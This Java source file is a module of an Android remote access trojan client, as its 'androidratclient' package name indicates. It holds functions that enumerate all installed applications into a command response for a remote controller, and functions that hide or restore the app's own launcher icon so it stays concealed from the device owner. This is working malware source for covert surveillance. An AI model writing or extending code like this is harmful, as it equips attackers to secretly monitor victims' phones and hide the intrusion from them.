package com.dev.ah10.androidratclient;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import java.util.List;

class Apps //Class to interact with applications
{
    //Context to use
    private Context ctx;

    Apps(Context appContext)
    {
        ctx = appContext; //Set the context for this module
    }

    //List installed applications on this device

    String listInstalled()
    {
        PackageManager pm = ctx.getPackageManager(); //Get the package manager
        List<ApplicationInfo> appInfo = pm.getInstalledApplications(PackageManager.GET_META_DATA); //List installed app info
        StringBuilder sb = new StringBuilder();
        sb.append("apps|"); //Response Command

        for (ApplicationInfo info : appInfo)
        {
            sb.append(info.name).append("|"); //Append app name + separator char
        }

        String result = sb.toString();
        result = result.substring(0, result.length() - 1); //Cut the last separator char at the end

        return result; //App list
    }

    //Hide our application icon from the list

    void hideAppIcon()
    {
        PackageManager pm = ctx.getPackageManager(); //Get the package manager
        ComponentName componentName = new ComponentName(ctx, com.dev.ah10.androidratclient.MainActivity.class); //Get out component name
        pm.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP); //Hide the application icon
    }

    //Show out application icon (after hidden)

    void showAppIcon()
    {
        PackageManager pm = ctx.getPackageManager(); //Get the package manager
        ComponentName componentName = new ComponentName(ctx, com.dev.ah10.androidratclient.MainActivity.class); //Get out component name
        pm.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP); //Re-Display the app icon
    }
}
